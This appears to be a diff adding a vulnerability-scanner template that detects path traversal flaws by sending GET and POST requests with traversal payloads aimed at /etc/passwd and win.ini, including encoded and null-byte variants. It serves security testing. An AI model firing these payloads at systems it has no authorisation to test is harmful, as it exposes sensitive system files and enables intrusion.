@@ -1,0 +1,93 @@
+id: path-traversal-enhanced
+info:
+  name: Path Traversal Detection (Enhanced)
+  author: pwn
+  severity: high
+  description: Detects path traversal vulnerabilities using GET and POST methods, targeting sensitive files like /etc/passwd and win.ini.
+  tags: lfi, path-traversal, file-inclusion
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../../../etc/passwd"
+      - "{{BaseURL}}/?filename=../../../../../etc/passwd"
+      - "{{BaseURL}}/?lang=../../../../../etc/passwd"
+      - "{{BaseURL}}/?page=../../../../../etc/passwd"
+      - "{{BaseURL}}/?view=../../../../../etc/passwd"
+      - "{{BaseURL}}/?path=../../../../../etc/passwd"
+      - "{{BaseURL}}/?dir=../../../../../etc/passwd"
+      - "{{BaseURL}}/?download=../../../../../etc/passwd"
+      - "{{BaseURL}}/?read=../../../../../etc/passwd"
+      - "{{BaseURL}}/?src=../../../../../etc/passwd"
+      - "{{BaseURL}}/?file=..\\..\\..\\..\\..\\c:\\\\WINDOWS\\\\win.ini"
+      - "{{BaseURL}}/?file=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\\\win.ini"
+      - "{{BaseURL}}/?file=..\\\\..\\\\..\\\\..\\\\..\\\\c:\\\\WINDOWS\\\\win.ini"
+      - "{{BaseURL}}/?file=..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini"
+      - "{{BaseURL}}/?file=/////../../../../../etc/passwd"
+      - "{{BaseURL}}/?file=//////////../../../../../etc/passwd"
+      - "{{BaseURL}}/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      - "{{BaseURL}}/?file=../../../../../etc/passwd%00"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        name: file-content
+        regex:
+          - "root:[x*]:0:0:"
+          - "daemon:[x*]:1:1:"
+          - "\\[fonts\\]"
+          - "\\[extensions\\]"
+          - "\\[mci extensions\\]"
+        part: body
+        condition: or
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/index.php"
+      - "{{BaseURL}}/view.php"
+      - "{{BaseURL}}/download.php"
+      - "{{BaseURL}}/read.php"
+      - "{{BaseURL}}/include.php"
+      - "{{BaseURL}}/main.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      file={{payload}}
+    payloads:
+      payload:
+        - "../../../../../etc/passwd"
+        - "../../../../../etc/passwd%00"
+        - "..\\..\\..\\..\\..\\c:\\\\WINDOWS\\\\win.ini"
+    attack: batteringram
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        name: file-content
+        regex:
+          - "root:[x*]:0:0:"
+          - "daemon:[x*]:1:1:"
+          - "\\[fonts\\]"
+          - "\\[extensions\\]"
+          - "\\[mci extensions\\]"
+        part: body
+        condition: or
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
